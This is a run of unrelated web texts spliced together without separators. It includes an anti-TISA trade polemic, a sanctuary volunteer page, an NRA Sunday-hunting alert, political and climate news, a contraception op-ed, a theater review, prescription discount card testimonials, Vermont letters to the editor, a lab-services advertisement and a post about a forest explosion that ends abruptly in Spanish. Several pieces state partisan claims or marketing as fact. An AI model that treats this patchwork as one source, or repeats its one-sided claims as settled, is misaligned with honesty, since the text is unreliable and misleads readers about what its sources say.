Regardless of the fate of current “free trade” deals, people around the world must be vigilant about deals currently under negotiation. The biggest is the Trade In Services Agreement (TISA). This is the backup plan in case the Trans-Pacific or Transatlantic deals don’t come to fruition. Under TISA, regulation of the financial industry would become illegal. TISA is being negotiated in secret by 50 countries, with the unaccountable European Commission representing the 28 EU countries. Among the other countries negotiating are Australia, Canada, Chile, Colombia, Mexico, Panama, Peru, Switzerland, Turkey and the United States.
Thanks to WikiLeaks, we know that Internet privacy and net neutrality would be history if TISA is implemented, and the dominance of U.S. technology companies would be locked in because any rule that in any way mandates local content or provides any advantage to a local technology would also be illegal. TISA’s language, if passed, would mandate that signatory governments allow any corporation that offers a “financial service” — that includes insurance as well as all forms of trading and speculation — to expand operations at will and would prohibit new financial regulations. Social security systems would be at risk of forced privatizations, the greatest wish of finance capital.
It would be folly indeed to believe that the world’s governments are suddenly going to decide, on their own, to reverse their neoliberal course. As they are captured by the corporate interests that dominate societies around the world and under the sway of the corporate ideology that suffuses into every corner, governments will turn their face toward working people only when mass movements force them to do so, and even then the idea that there is some permanent solution within capitalism is a chimera.

Sanctuary: Oak Knoll

Are you looking for an opportunity to be part of fun community events? Are you limited on time but still want to volunteer? Then Special Events is the place for you! Each year we have several Special Events that require a large amount of volunteers. The events are one day only, so they are perfect for those that cannot do weekly or monthly volunteering but still want to help out.
In June Oak Knoll has a 21+ event called Night at the Knoll, in early spring our Egg Hunt takes place, and in October our largest event is Spooktacular. Volunteer jobs range from check-in, set up/break down, selling raffle tickets, passing out prizes, running craft tables, selling baked goods, finding items for raffles, and more. Volunteers are asked to commit to a shift of 2 hrs 4 hrs or 8 hrs depending on the event.
Volunteers will need to pass a background records check (CORI and SORI).
Available Shifts: Dates vary depending on the year.

Virginia: Senate Committee to Hear Sunday Hunting Legislation Tomorrow!
Wednesday, January 18, 2012
Support NRA-ILA
Tomorrow at 2:00 p.m. in Senate Room A of the General Assembly Building, the Senate Agriculture, Conservation and Natural Resources Committee will consider four bills that would repeal the statewide ban on Sunday hunting in Virginia.
Currently, Virginia is one of only six states in the country that strictly bans hunting on Sundays. This prohibition harms Virginia’s economy and threatens the very future of our hunting heritage by discouraging hunter recruitment and retention. It is time that the decision on this hunting policy, like virtually all others, be delegated to the Virginia Board of Game and Inland Fisheries.
At a time when the economy is struggling and too many Virginians are out of work, legislators must not continue to refuse the enormous economic benefits associated with allowing hunting on Sundays. Comprehensive research from the National Shooting Sports Foundation shows that allowing hunting on Sundays would generate a total annual economic impact estimated at $296 million and create 3,927 jobs. All of this would be spurred by simply eliminating words from state statute books (the current prohibition), not spending taxpayer dollars on some pie-in-the-sky scheme.
Three of the four Sunday hunting bills are essentially identical. Senate Bill 151 (sponsored by state Senator Phillip Puckett (D-38)), Senate Bill 464 (sponsored by state Senator Ralph Northram (D-6)) and Senate Bill 512 (sponsored by state Senator Frank Wagner (R-7)) would repeal the current ban by striking the section of the state code that directly forbids any type of hunting on Sundays. Under Senate Bill 173, sponsored by Chap Petersen (D-34), the ban would be repealed by adding language to allow persons to hunt on their own land, as well as any other private land as long as they have written permission from the property owner.
Please contact members of the Senate Agriculture, Conservation and Natural Resources Committee TODAY and urge them to support repealing this antiquated ban on Sunday hunting. Their contact information can be found here.

Nevada becomes first state with female-majority legislature
By STORM GIFFORD
Dec 18, 2018 | 11:15 PM

For those waiting for America’s very first female-majority legislature the Silver State is pure gold.
With the appointments of Rochelle Thuy Nguyen and Beatrice Angela Duran, women hold 32 of Nevada’s 63 state-controlled seats.

While women fill just nine of the 21 Senate senates, they possess 24 of the 42 Assembly seats — giving them the narrowest of total margins.
“It is unprecedented at this point to see a majority female legislature overall,” said Rutgers-Camden political science professor Kelly Dittmar, who cited studies that show women serving in Congress are likely comparable to women claiming legislature seats.
“The more women you have in the body, the more that their perspectives and life experiences are integrated into policy debates and deliberations.”

Prior to this year, New Hampshire was the lone state to hold a female majority in any legislative chamber, reported PBS News Hour. And even that was for just a two-year period from 2009 to 2010, when they ruled the state Senate.
After the 2018 elections, the Colorado State house was split down the middle — half male, half female.
Dittmar hopes the appointments lead to a more representative sampling of legislative bodies across the country.
“That might influence young people,” said the professor. “It might influence other women to see that body as both friendlier to them as well as more responsive to their concerns.”

What States Can Do on Birth Control
By Jack A. Markell
April 12, 2016
Dover, Del. — DURING my years of working in public life, I have witnessed countless ways in which unplanned pregnancy disrupts people’s lives. So one of the best ideas I’ve seen for how to help everyone reach the next rung on the ladder is providing access to effective contraception. Enabling women to become pregnant only when they want to is a shortcut to prosperity.
According to new data, there are 6.1 million pregnancies a year in the United States. Of these, nearly half (2.8 million) are unplanned. In Delaware, that proportion is even higher, at 57 percent — partly because, like others, we haven’t focused on the issue until now, and partly because of poor access to good contraception.
According to the Centers for Disease Control and Prevention, the American College of Obstetricians and Gynecologists and the American Academy of Pediatrics, the new generation of intrauterine devices and implants known as long-acting reversible contraception are the most effective female contraceptive methods. They also have higher patient satisfaction rates than other methods, and one study showed that they are 20 times less likely to fail than the pill, patch or ring (the most common forms of contraception offered to women).
Research also shows that making these new devices, along with other forms of birth control, easily available to patients without cost, combined with good counseling, could reduce national abortion rates by 62 percent to 78 percent. Yet, fewer than 10 percent of American women of reproductive age use these methods. In Western Europe, for example, where their use is higher, rates of unplanned pregnancies are much lower.
Why doesn’t the American system prioritize good reproductive health care?
Unintended pregnancy is associated with a wide variety of negative health, economic, educational and psychological outcomes, for children and for parents. When women have unplanned pregnancies, they don’t go for prenatal care as often as recommended. Research also shows that children born in such circumstances are less likely to experience success in school and later life.

Right now, Delaware’s health care system is not prepared to make long-acting reversible contraceptive methods easily available to women. Many providers are not trained to place I.U.D.s and implants; nor are systems here set up to bill and code for them properly. There are also misunderstandings about medical eligibility that deprives women of same-day access to the full range of options.
In a national survey, fewer than 20 percent of respondents said that their community health centers (on which many low-income women rely) offer the full range of contraceptive methods. And unplanned pregnancy rates among women at or below the poverty level are more than five times as high as among the most affluent women.
To address these problems, Delaware has formed a public-private partnership with Upstream USA, a nonprofit group that provides training and advice to health centers to improve reproductive health care and access to contraception. The initiative has raised millions of dollars from philanthropic sources, while the state has reallocated about $1.75 million from the Division of Public Health budget for the project. By the end of 2017, we will ensure that the nearly 200,000 women of reproductive age in our state have access to the full range of methods.
When Colorado pioneered a similar program, in three years it saw savings of $5.85 in Medicaid costs for every $1 invested, because mothers and babies ended up healthier. Although the State Legislature’s failure to pass a bill providing further funding has hampered Colorado’s efforts, the program’s benefits — better birth outcomes, a reduced teenage birthrate and millions of dollars saved — are cause for celebration. With luck, the Legislature will change course this year.
Delaware’s initiative will be subject to a rigorous evaluation process that will not only track pregnancy and birth outcomes, but also assess its impact on birth-related spending in Medicaid and private insurance plans. Changes in reimbursement policy can help.
In most states, Medicaid pays a bundled rate for many services, including for labor and delivery. That fee doesn’t allow for the cost of putting contraceptive devices in place immediately after women give birth, even though we know that effective postpartum contraception enables greater birth spacing. Delaware has now joined states including Texas, New York, Alabama and Illinois that have changed their Medicaid policies so that the cost of placing an intrauterine device or implant directly after delivery, if a woman wants one, gets bundled with the hospital’s charge for obstetric care.
Others should consider initiatives like this: State governments have few ways to get such results. By helping women choose when to become pregnant, we can improve health, save millions of dollars and help restore economic opportunity to more of our citizens.
Jack A. Markell is governor of Delaware.

The Many Ongoing Public Transportation Projects of the Bay Area
When Traffic Solutions Cause Travel Delays
Opinion: Even the Green New Deal Repeats the Same Old Sprawling Mistakes
Atlantic Station On Track In Atlanta
Atlantic Station, an ambitious multibillion-dollar mixed-use project is ready for the first phase.
November 6, 2001, 9am PST | Abhijeet Chavan | @legalaidtech
Share Tweet LinkedIn Email Comments
"On Oct. 24 and 25, Atlantic Station developers Jacoby Development Inc. and AIG Global Real Estate Investment Corp. got $76.5 million from the sale of tax allocation bonds (the first tax allocation bond issue in state history) and closed on an $80 million construction loan, allowing the developers to finally close on the 140-acre land purchase for the project and setting the stage for the first residential and retail pieces of the multibillion-dollar project."

Tappan Zee Bridge v2.0: Dedicated Walking & Bike Path?
As state authorities prepare to replace the aging bridge, local officials and interest groups propose an "exciting" alternative to demolition.
February 25, 2012, 7am PST | Ryan Lue
Share Tweet LinkedIn Email Comments
The New York State Thruway Authority may begin work on a new bridge to replace the 56-year-old Tappan Zee Bridge as early as next year, and is seriously considering a proposal to maintain it as a separate route for pedestrians and cyclists.
Already six years past its projected lifespan, the Tappan Zee Bridge would cost $150 million to demolish, compared to the $50 million annual maintenance bill it runs under current conditions.
So Greenburgh Town Supervisor Paul Feiner suggested that the state hang onto it. "The idea immediately gained support from biking and pedestrian groups," writes Peter Applebome, and those groups in turn came together to form the Tappan Bridge Park Alliance.
Gov. Andrew Cuomo called the idea "exciting" and, along with the executive director of the State Thruway Authority, expressed support for further study of the project.

A world on the brink
How a global ecological crisis could become more expensive than any sovereign-debt crisis.
European Voice
By	Jennifer Rankin	
5/18/11, 9:35 PM CET
Europe is in the grip of an escalating debt crisis that goes far beyond billion-euro bail-outs and nervous bond traders. This is an ecological debt crisis: a story of accelerating extinction, degraded forests, polluted rivers and seas, choked skies and rising temperatures.
On 21 August 2010, the world was officially ecologically in the red. This was the point in the year when humanity had used up its annual budget of natural resources – carbon-dioxide absorption, land, timber, food and fibre and seafood – and tipped into ecological deficit. Every year “Earth Overshoot Day” has been creeping forward as demand for resources continues to grow and supply constraints tighten.
As with their financial equivalents, it is tempting to ignore ecological deficits. But sooner or later, the consequences have to be faced: natural resources become depleted, pollution becomes overwhelming. A group of scientists writing in Nature in 2009, concluded that humanity has already crossed three critical boundaries: biodiversity loss, climate change and the nitrogen cycle.
This ecological deficit has been run up in record time. Around 50 years ago, the vast majority of countries were in ecological surplus, ie, they were within the limits of the world’s natural resources. But between 1961 and 2007 human demand on the natural world doubled, according to the Global Footprint Network, a non-governmental organisation that promotes awareness of Earth Overshoot Day. In effect, the world is living as if we had one and a half planets, according to the “Living planet” report, a regular survey of the world’s “biocapacity” by WWF, a conservation group. If current trends on population growth, consumption and climate change continue, the world will be consuming the equivalent of two planets by 2030, the report states.
Concern is not just the preserve of environmentalists and scientists. A report by the World Economic Forum, which organises the annual gathering of economic and business leaders at Davos, has also sounded the alarm about unsustainable pressure on natural resources, highlighting the incentives that encourage “short-term responses in production and consumption that undermine long-term sustainability”.
Next week the Organisation for Economic Co-operation and Development (OECD), a rich-country think-tank, will publish a “green growth strategy” for world leaders at an event which forms part of the OECD’s 50th anniversary celebrations. “The environment and the economy can no longer be considered in isolation,” said the OECD’s interim report last year, which called for green growth to transform production processes and consumer behaviour.
A green economy
The European Union has also been busy drawing up strategies. In January the European Commission published a plan for a “resource-efficient Europe”, one of the so-called flagship initiatives of the EU’s economic strategy for the next decade. Next week (24-27 May) hundreds of officials, business representatives, green groups and academics will gather in Brussels to discuss these ideas at the Commission’s annual green week conference.
There is no shortage of informative reports. The problem is the yawning gulf between understanding the problem and taking action. This is “the great conundrum of our times”, says Tony Long, director of WWF’s European policy office. “The prospects for a successful realisation or implementation of a new set of policies to correct these past wrong choices or past wrong signals is pretty dim,” he concludes.
This disconnect can be explained by “vested interests”, “inadequate policy levers” and possibly “a population that is not ready for change”, he says. As such, the answers he proposes are equally wide-ranging. Policymakers should come up with new ways of measuring resources to count environmental costs, as well as making it “fashionable to consume less”. But Long also lays down a challenge for conservationists, scientists and environment officials. They need to look for new allies, by contacting “a group of politicians we haven’t appealed to or engaged with – finance ministers. This is a very powerful political class that haven’t been touched.”
In Europe at least, this means persuading the economic elite to divert their gaze from the eurozone crisis and to pay attention to a debt crisis that could have far more profound and long-lasting consequences.

Movement, but no breakthrough
The last scheduled day of negotiations has begun in Copenhagen, with signs that serious bargaining has started.
European Voice
By	Jennifer Rankin	
12/18/09, 2:00 AM CET
Updated 4/12/14, 6:52 PM CET
COPENHAGEN | “Parties have recognised the urgency of action on climate change and have now provided the political response to what scientists have been telling us is needed.”
No, there was no dramatic breakthrough in Copenhagen last night. This statement was made two years ago in Bali by Yvo de Boer, the UN’s top climate official, after the world agreed to work towards a new global plan to tackle climate change.
At the 2007 Bali climate conference, environment ministers promised a shared global vision on the climate problem, targets and actions to reduce emissions, as well as “adequate, predictable and sustainable” sums of money to help developing countries. All these decisions would be taken in Copenhagen.
Now, on the last scheduled day of the Copenhagen climate summit, all the big questions – including targets and money – are hanging in the balance. After two years of thinking, punctuated by several weeks of intense negotiations, the result hangs on what 119 world leaders can agree in a few hours.
Positions begin to shift
The mood lifted yesterday, as negotiators finally began work on the substance of the texts after a day wrangling over process.
The big news of the day was the statement by Hillary Clinton, the US secretary of state, that the administration was “prepared to work with other countries” to raise $100 billion (€70bn) a year by 2020. This was the first time the US has put a price on the scale of the problem, although it did not spell out what share of a climate financing deal it should give.
The EU has talked of global funding needs of €100bn by 2020. Some MEPs were quick to point out the dollar-euro difference, but welcomed signs that countries are beginning to coalesce around one number.
Fact File
Playing the EU’s hand
The Copenhagen talks are dominated by the actions and intentions of China and the US, which together make up around half of all global emissions. But EU negotiators maintain that the EU has a valuable role to play.
Within the EU institutions there are different views on how to play the EU’s hand. The European Commission and the Swedish presidency are keen to use the EU’s pledge to cut emissions by 30% if others make similar efforts as a bargaining chip. Andreas Carlgren, Sweden’s environment minister, has spoken of not under-selling the 30% target.
But MEPs want a swift promise to make 30% cuts. Satu Hassi, a Finnish Green MEP, said she was impatient for the EU to move to 30%. “The EU is repeating and repeating that others should move. I think the EU should move itself. This is the time to give our next offer…The more proactive the EU is, the more decisive a role it can play.”
The EU welcomed Clinton’s announcement, although Andreas Carlgren, Sweden’s environment minister, said “other steps” would also be needed from the US to create momentum.
Campaigners said the sums were too low. However, Jennifer Morgan, director of the climate and energy programme at the World Resources Institute, an American environmental institute, said: “Financing was one of the missing pieces in Copenhagen. This announcement offers a more hopeful story about what can be achieved here.”
There were also signs of a thaw between the US and China over the issue of how to verify emission-reduction efforts by developing countries. He Yafei, China’s deputy minister of foreign affairs, said yesterday that China was “willing to have explanations and clarifications and consider international exchange of dialogue and co-operation that is not intrusive and does not infringe on China’s sovereignty”. Although He warned against “mutual suspicion”, he suggested that China was more open to scrutiny than it has been in the past.
Meanwhile, the negotiating process stepped up a gear, with officials splitting into 16 sub-groups yesterday to discuss different issues, ranging from action to halt deforestation to targets and finance. The texts are still full of square brackets, signalling areas where agreement is lacking, but negotiators appear to have reached the point where serious bargaining begins.
One key bargaining point for the EU is how it fulfils its emissions-reduction pledges. The EU has long promised to cut emissions by 20% by 2020, using 1990 as the reference year, and extend this to 30% if other rich countries join in. EU negotiators in Copenhagen are looking at variants across the 20-30% scale, depending on what other countries offer.
Inadequate pledges?
Prospects for a deal were looking up, but campaigners warned last night that it may be too little to protect the planet from profound climate changes.
Current emission-reduction pledges were not enough to keep global warming below 2ºC, the long-established scientific guardrail and political goal, according to campaign groups. WWF and Greenpeace cited a leaked internal document from the UN climate secretariat that was drawn up earlier this week, which showed that current pledges would lead to 3ºC of warming or more.
Keith Allott at WWF UK said: “The stark message for world leaders at Copenhagen is that the proposals on the table, especially from industrialised countries, fall far short of what the world needs.
“It is a case of simple maths – we need much more ambitious targets for developed countries, new and additional financial support to help low-carbon growth in developing countries, and action to plug the many loopholes that make existing emission pledges even weaker than they seem at first glance.”
In less than 24 hours the political response promised in Bali should become clear.

Theater review: AIRE wraps up theater, song and dance in delightful gift
'A Celtic Christmas' at Portland Stage's Studio Theater includes 'A Child's Christmas in Wales.'
By Steve Feeney

Read Article
The American Irish Repertory Ensemble has brought back its production of “A Celtic Christmas,” last presented in 2011. It’s a celebration of holiday traditions that warmly and playfully emphasizes the spirit of community.
With new actors and musicians, AIRE opened the show Thursday night before a welcoming audience.

Theater review
WHAT: “A Celtic Christmas” by AIRE
WHERE: Studio Theater at Portland Stage Company, 25A Forest Ave., Portland
REVIEWED: Dec. 11; continues through Dec. 21
HOW MUCH: $12-$22
INFO: 799-5327; airetheater.com
Songs in English and Gaelic, step dancing, juggling and much more filled the intimate Studio Theater space at Portland Stage.
The show began with a dramatic enactment of Dylan Thomas’ seasonal favorite “A Child’s Christmas in Wales.”
Five adults plus three child actors and a little dancer brought to life Thomas’ poetically imagined prose recollection of a childhood lived in simpler times.
Director and actor Tony Reilly has re-sequenced the episodes slightly from the original. But the piece has lost none of the sense of excitement and wonder children experience in a world made up of an almost magical nature tended by mysterious and often comical grownups.
The child actors will alternate from performance to performance. At Thursday’s opening, the youthful roles were impressively filled by Ellie Lomangino, Jonathan DeRoche and Grace Blankenship.
Whether encountering canny hand puppet cats, a juggling mailman, a potential witch or snoozing uncles, the kids maintained a playful bearing while reciting Thomas’ flowing lines with nary a hitch.
The adult performers included Susan and Tony Reilly, Matiss Duhon, Thomas Ian Campbell and Lisa Boucher Hartman.
Each was given an opportunity to lend their unique talents in this fine ensemble interpretation of the evocative work.
The expressionistic set design by Anthony Martin and costumes by Kate Egan and Carlene Stillson added to the sense that the audience was visiting a time and place where a spirited imagination could still be transformative.
“The Legend of the Wren,” conceived by the Reillys, completed the program in high style.
Based on a tradition of wren-boys who go house to house to collect money to fund a community gathering, subject to some more and some less bird-friendly interpretations, the piece featured all of the performers from the earlier work plus a quartet of young dancers from the Stillson School of Irish Dance.
With the spirit of a variety show, the episodic story gave Duhon a chance to amaze all with his juggling, while Hartman sang a lovely religious song, Campbell played a sort of mini-bagpipe and later a mandolin, and the Reillys displayed their theatrical and musical gifts.
The hilarious song “Miss Fogarty’s Christmas Cake” was a particular highlight.
The dancers were great fun to watch in a passage that wonderfully mixed ballet-like elements with high-stepping folk dance.
A final sing-along on “Silent Night” brought the sweetly entertaining evening to a close on a warm and cozy note.

Adapting to climate change: Terra Nova
16th Oct 2013	Web Team Case Studies
About the project
There's an important distinction between climate change and climate change adaptation. Research into climate change looks at questions of how the climate is changing and how this change will affect the environment. Climate change adaptation looks at how we can respond to these changes – how we can reduce the impacts of stresses on human and natural systems including our cities and regions, our agriculture and aquaculture, and the biodiversity of our environment, and how we can harness any beneficial opportunities. In other words, what should we do to prepare and adapt?
Imagine you work for the Queensland Department of State Development, Infrastructure and Planning, and you're working on the next 20-year regional plan for Southeast Queensland. Where do you find out about the options you might have for managing risks and increasing the region's resilience? Climate change adaption is a new field of research. There are some research reports available, if you can identify them, but you may have to wade through 600 densely written pages in each report to find the information you're looking for. There may also be some grey literature and case studies from other regions outlining responses they have taken to climate change, but finding any that are relevant to you may be extremely difficult.
This is where Terra Nova comes in. Terra Nova is an information hub for climate change adaptation research. It's about making it easier for everyone who needs climate change adaptation information to discover, share, and use it. It's also a failsafe to make sure this vital information is preserved and made accessible. Terra Nova is an initiative of Griffith University, QCIF, and the Australian National Data Service (ANDS).
Sam Mackay, Senior Analyst with the project, previously worked for the Queensland Government as a policy officer for climate change adaptation. He says Terra Nova has great potential to bridge the gap between researchers and planners. "On the one side you have a range of Australian researchers creating sophisticated climate models. On the other side you have conservation planners, and there is a big gap between these groups. Terra Nova enables the possibility through tools to bridge the gap." For example, the site includes a visualisation tool that can be used as a standard interface to climate change models created for specific purposes. The tool not only makes it easy to see and understand climate change modelling data, it also allows data generated for one particular purpose to be re-used for many other purposes, and this re-use extends the reach of the original research investment in collecting the data.
Terra Nova are working collaboratively with the Australian Government to act as the repository for research they have funded under the $8 million National Resource Management (NRM) Climate Change Impacts and Adaptation Research initiative. Under this program nine project teams from research institutions are working with regional NRM organisations across Australia to deliver climate change information and provide guidance on the effective use of that information in resource management planning processes. Mackay sees this as a great example of the key role Terra Nova can play in helping to make research data and information more securely stored, readily discoverable, and more frequently re-used. "These kinds of linkages between eResearch infrastructure and major research projects show that governments are now thinking about information management in a way that wasn't even on their radar before."
QRIScloud, operated by QCIF, is offering the hundreds of terabytes of storage required to host Terra Nova's extensive and expanding data collections and to make them widely available to researchers, governments and other interested parties. Mackay believes the infrastructure provided by QRIScloud enables projects such as Terra Nova to become a reality. "Terra Nova is a seed project. It needs to be incubated. Having a storage infrastructure freely available upfront with QRIScloud really helps ideas like Terra Nova get established and mature. Without economical and straightforward access to these capital-intensive facilities, it would be easier for universities to put these projects off. The kind of thinking we've done with Terra Nova wouldn't be anywhere near where it is without the thinking in initiatives like QRIScloud and QCIF."

SAVING OF 70%
I want to thank you for your prescription card. My thyroid medicine was going to cost me $118 a month. Well, naturally, I thought of your card. You site said for 240 tablets a month it would be about $36. A saving of $82, or roughly 70%. Thank you for the relief your card has previously given to me now and in the past.
- M. Axler
SAVING OF OVER $200!
Thank you for putting the RxGo on the internet. I saved over 200 dollars On my prescription. I would have never been able to afford it had it not been for this product. Again I cannot thank you enough and keep up the good work!!
- Linda S.
SAVING OF OVER 50%!
I had printed out 3 different discount cards on the internet and asked the pharmacist to check prices. The lowest price was $289. I searched the internet some more, I found this site, gave the pharmacy your card and the cost was $130. What a big saving, I can't thank this site enough.
SAVINGS OF 70%! "If you have a high deductible medical insurance (like me) or no insurance at all and you want to save money on your prescriptions, print a card. It's free and no personal information required. This card saved me $218.89 today on my prescription! It's unbelievable but it`s true. I am so grateful, for now I can actually afford my medication." Zarah
SAVINGS OF 70%! "Hi! Just want to say thanks to this website for providing a card such as this to the public for free! A few weeks ago I printed out one of your cards and used it on one of my medications because my co-pay went up and to my surprise instead of paying a $45.00 co-pay through my insurance, I ended up paying only $17.00 by just running it through the discount card! Now I will be comparing prices!" Steve
SAVINGS OF 70%! "I went to a chain pharmacy today and wanted to fill a prescription and not run it through my insurance.They quoted me $164.00 for a 90 day generic supply, I asked them to double check and it was the best they could do. I came home, checked your online price, registered and had a card in 15 seconds. Went back, and the prescription was $16.92!"
"FYI the pharmacist asked for the website and wants it to refer customers in store directly. I don’t quite understand how it works, but honestly, I don’t care how it works, it did!!!!" Ivan S.
SAVINGS OF 70%! "Today I went to get a seizure Rx filled at the pharmacy for my daughter, Erica. The pharmacy told me it would be $230. I used your card and it cost me less than $28. Thank you so much." Melissa
SAVINGS OF 70%! "I needed an prescription eye drop last week. The cost was going to be $129. With your prescription savings card it cost $25! I’m telling everyone I know. Thanks!!" Monday M.
SAVINGS OF 70%! "When I first used my card, both the pharmacist and I were amazed! She took the information from it for herself and then compared the costs to what my prices would have been had I gone through my insurance (I had none at the time I 1st used my card), and I still saved a lot of money!! They entered the new info. into their system and in the meantime I`ve told lots of friends and family members about how to save.....THANK YOU SO VERY MUCH!!!!!" Elizabeth H.
SAVINGS OF 70%! "My beloved Border Collie - named Mickey - was recently diagnosed with a form of plasmacytoma cancer and is on both Melphalan and Prednisone drugs as part of his monthly treatment. I printed out the prescription savings card and took it to my local pharmacist. I was so pleasantly surprised to know that the card indeed will save us money! I was able to buy the Melphalan chemotherapy drug for $34 less than the last 2 months, since we started treatment! Thanks so much!" Mary L.
SAVINGS OF 70%! "Wow! I can`t believe this actually worked. I have no insurance at this time and have to pay
I lost my insurance coverage and went online seeking help and found this CARD! It worked and saved me money $$$$$ very 1st time. There are others out there but with less coverage and a smaller list of drugs or they charge you a monthly fee. I am so happy I take 3 prescriptions a month forever and at times more and I will save over 78% as I figured it out, and that is great tell everybody you know as I am doing." David B.
SAVINGS OF 70%! "My husband and I lost our insurance. This is the card to use to save money. His blood pressure medicine is $55. I now can get it for $13.44. That is quite a difference!" Candace
SAVINGS OF 70%! "Thank you SO MUCH! My patients have saved so much money using these cards." Danielle <br/>Primary Care Coalition<br/>primarycarecoalition.org
SAVINGS OF 70%! "While I am blessed to be a Medicaid patient, I know plenty of people which could include me if I didn’t have Medicaid who rely heavily on the WalMart and Target $4 lists. After comparing prices on this and other sites I have seen that there is the greatest free drug card savings potential on this site. I have already printed out 3 cards for loved ones." Jacques M.
SAVINGS OF 70%! "I have been using the RX card for almost a year now. In that time, it has saved my family over $4000. We have no insurance, and the RX card has been a God send. My husband and I are both disabled, and my 65-year old mother is almost blind and diabetic, so we would have simply had to do without. The RX card enabled us to have the meds we need. Thank you so very much!" Sharon H.
SAVINGS OF 70%! "Today, on three different prescriptions, I saved over $70!!! Thank you so much." Susan

The Real World: Victory
[Re "Threats, Lawsuits and Dead Animals," March 18]: As I was reading about the town of Victory in Seven Days, I couldn't help but think that eventually some investigation will lead to the discovery of who is responsible for all the alleged misdeeds in town, and that any individuals responsible will be brought to justice. And we'd all get to read about it in a subsequent article.
Then it occurred to me: That is the last thing that should happen. Instead, build a fence around the place so that nobody can escape, and then bring in the movie cameras and make a reality TV show. The revenue produced would pay all the reparations and penalties, and the whole town would get rich.
Or, more likely, with all that money flowing around town, they'll have a new order of magnitude of resources to fight over, and the entire kerfuffle will escalate to the next level, to a self-perpetuating and self-sustaining orgy of orneriness.
You can't make stuff like this up, and this is, indeed, the genuine article — all-natural, 100 percent organic and sustainable, pure Vermont vilification, venom and vitriol. Package it, sell it and tax it — just like craft beer, maple syrup, artisan cheese and spring water!

Gone Fishing
It has been a while since I bitched and moaned about something — say, about 15 minutes — so I would like to make a comment concerning last week's Fair Game ["Date Certain," March 25], in which Paul Heintz commented on the danger of crossing the Speaker of the House. He wrote, "If you cross the speaker on a vote like this, pack your bags for legislative Siberia. Otherwise known as the House Fish and Wildlife Committee."
If I were a legislator, I would probably be permanently appointed to fish and wildlife, as I would always cross the speaker. And it would not be a bad appointment, as I could spend the time lobbying for the elimination of the fake deer entrapment method used by game wardens to incite irresponsible use of firearms by stupid individuals — a safety issue for all.
Bottom line: Retire fake deer from the fish and game budget and encourage proper use of firearms and not improper use by entrapment. Fish and wildlife is not all bad in Vermont.

Senator Say Sorry
[Re Off Message: "By Lopsided Vote, Vermont Senate Approves New Gun Regulations," March 25]: Sen. John Rodgers (D-Essex/Orleans) owes a majority of Vermonters a public apology. I am insulted and infuriated at his comments during gun legislation debates in which he said people "who moved to Vermont because they liked the culture are welcome. Others, who have stated that they want to change our culture here, may want to seek another place that has a culture that they like."
How dare he say I should leave the state because I do not agree with his view of Vermont culture? I was not aware that we had a culture czar in Vermont who determined what is and is not "Vermont culture." I live here, pay my taxes and I do not sit in the back of the bus. My opinion and views are as valid as anyone else's.
Sen. Rodgers owes me, and all Vermonters who support gun safety, a public apology. He is representing a vocal minority of anti-gun safety activists. Seventy-seven percent of Vermonters — a majority — favor extending background checks to all gun sales, which is not even being considered by the current legislation.

BCA Gets an A
In "Big Heavy World Director Challenges Burlington City Arts" [March 11], I found myself confused by James Lockridge's assertion that "A spirit of inclusion and collaboration has been missing from the city's arts missions." As someone who has been active in the Burlington arts community for nearly 40 years, I have watched the BCA grow and expand to be an organization that takes its responsibilities seriously and has repeatedly attempted to be supportive of all art forms.
The BCA not only financially supports and assists programs that serve an expanding Burlington community, it acts as a remarkable umbrella organization for new art projects. This was the case with the Architecture + Design Film Series, of which I was a founding member. BCA enthusiastically embraced this project and provided remarkable support — physically, technically and creatively.
BCA programming itself is broad and attempts to reach all types — pre-school though elderly, teens and new Americans — and branches out into all areas of the city. Not every community member is served, but I have observed BCA proactively stepping into new undertakings throughout the city and keeping an eager ear open for ideas and possibilities. The BCA does have open meetings. Jim Lockridge and I attended a recent one. I spoke and felt "heard." I am hoping he did, also.

Listen to Lockridge
Your coverage of James Lockridge's work to improve the transparency and breadth of Burlington's arts administration was disturbing ["Big Heavy World Director Challenges Burlington City Arts," March 11]. From the first sentence you suggested that artists who had received money from Burlington City Arts would probably have no criticisms of the arts organization, as if individual personal profit could buy artists to ignore possible problems with arts governance.
Further, you presented BCA, an office partially funded by Burlington taxpayers, as virtually above criticism — a dangerous precedent. Citizens should be thanked, not ridiculed (Is Lockridge obsessive? Why not passionate?) for making sure that city departments follow public-meeting rules.
Most discouraging was your representation of a BCA still unwilling to welcome board members from the local artist community, whether by incorporating them into their current board or establishing a better election process. As for BCA's listening tour and involvement in planBTV South End, I am afraid that many South End artists — even ones who got grants — do not feel that BCA has been working in the interest of preserving the arts district from the threat of a change to residential zoning and its inevitable accompanying rise in rents. I hope that your reportage is incorrect, and that BCA and the rest of city government is really beginning to listen to Lockridge and a growing group of supporters advocating for reform.

Risk Management Nutritional Labeling
The nutritional labeling services of SGS help your food products to meet the appropriate legal requirements and industry-agreed quality standards.
Accurately labeled nutritional packaging has to include measurements for calories, fat and vitamin levels, protein and carbohydrates. And the labeling must be consistent, right across your product range.
Our nutritional labeling services combine the accuracy of our testing regime with the efficiency of our cataloging processes, ensuring both precision and reliability. This means you can be highly confident about promoting the quality of your pet food, livestock feed, forages, grains and other food products.
Top technicians, advanced technologies
Using their years of experience and extensive training in chemistry, microbiology and agronomy, our skilled scientists apply the latest testing methods to your food products. Furthermore, our high-tech labeling laboratories operate under strict guidelines and are accredited to ISO/IEC 17025 and ISO 9001:2008.
Ensure your packaged animal feed and other food products meet the appropriate quality standards by using our nutritional labeling services. Contact SGS to find out more.

Explosion In Scottish Forest - Meteorite Impact?

Garadhban Forest near Loch Lomond
At about midday on Wednesday 17th November, a member of the public reported hearing a loud explosion from the area of Garadhban forest in Gartocharn, near Loch Lomond (near Glasgow) Scotland. Ten years ago, authorities would have responded to a report of an explosion in a forest with puzzlement and an at least semi-open-mind. But the bogus 'terror threat' has closed minds all around the world, and yesterday's event was immediately responded to by the 'anti-terrorism' police. Upon observing the scene and seeing damage to trees over a wide area, explosives were suspected (naturally!)
Mainstream media pundits have exercised due diligence however in exploring the possible causes, with theories ranging from terrorists testing explosives on trees, terrorists testing explosives on woodland creatures, to terrorists testing explosives on themselves:
I can't help thinking that tonight, as this investigation continues, one of these terror-minded securocrats might be inspired to remove his head from his posterior and look up at the night sky. If he did, he might remark on the fact that there seem to be a lot of bright, flashy, light-type things shooting across the sky.
The Leonid meteor shower peaks tonight, November 18th. Traditionally, the Leonids present as high altitude (100kms) 'shooting stars' in the night sky that can reach as many as 3,000 per hour at their peak. This year however, 'the Leonids' appear to be putting on a strangely intense show.
No son las habituales Leónidas
